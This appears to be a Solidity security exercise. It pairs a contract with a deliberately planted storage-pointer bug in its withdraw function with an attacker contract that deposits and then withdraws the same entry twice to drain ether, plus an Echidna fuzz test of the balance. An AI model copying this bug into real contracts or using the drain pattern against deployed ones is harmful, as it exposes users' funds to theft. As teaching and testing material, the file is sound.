pragma solidity 0.8.15;
import "hardhat/console.sol";

/**
 * This contract starts with 1 ether.
 * Your goal is to steal all the ether in the contract.
 *
 */

contract DeleteUser {
    struct User {
        address addr;
        uint256 amount;
    }

    User[] public users;

    function deposit() external payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }

    function withdraw(uint256 index) external {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        print();
        users.pop();

        msg.sender.call{value: amount}("");
    }
    function print() public {
        console.log("----------------------------------");
        for (uint256 i = 0; i < users.length; i++) {
            console.log("index: ", i);
            console.log("user: ", users[i].addr);
            console.log("amount: ", users[i].amount);
        }
        console.log("----------------------------------");
    }
}

contract DeleteUserAttacker {
    DeleteUser deleteUser;

    constructor(address _user) {
        deleteUser = DeleteUser(_user);
    }
    receive() external payable {}

    function attack() external payable {
        deleteUser.deposit{value: msg.value}();
        deleteUser.deposit{value: 0}();
        deleteUser.deposit{value: 0}();
        deleteUser.print();

        deleteUser.withdraw(1);
        deleteUser.withdraw(1);
        deleteUser.print();
    }
}

contract FuzzDeleteUser is DeleteUser {
    // Constructor to initialize the contract state

    constructor() payable {
        require(msg.value == 1 ether, "Must deposit exactly 1 Ether");
        users.push(User({addr: address(0), amount: msg.value}));
    }
    function testDeposit() public payable {
        users.push(User({addr: msg.sender, amount: msg.value}));
    }
    function testWithdraw(uint256 index) public {
        User storage user = users[index];
        require(user.addr == msg.sender);
        uint256 amount = user.amount;

        user = users[users.length - 1];
        users.pop();

        msg.sender.call{value: amount}("");
    }

    function echidna_test_balance() public view returns (bool) {
        return address(this).balance >= 1 ether;
    }
}
